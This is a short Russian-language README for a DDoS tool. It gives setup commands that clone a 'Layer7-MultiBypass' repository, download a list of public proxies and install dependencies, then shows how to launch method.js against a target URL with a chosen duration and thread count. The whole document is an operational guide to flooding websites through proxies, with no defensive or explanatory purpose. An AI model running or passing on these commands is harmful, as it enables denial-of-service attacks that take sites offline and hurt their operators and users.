# DDoS

## Установка

    apt install npm nodejs git -y
    git clone https://github.com/R00tS3c/Layer7-MultiBypass l7mb
    cd l7mb
    rm -rf proxies.txt
    wget -O proxies.txt https://api.proxyscrape.com/?request=getproxies
    npm install

## Запуск

    cd l7mb
    node method.js [URL] [SECONDS] request [THREADS]
    
### Example:

    node method.js https://example.com 10 request 10
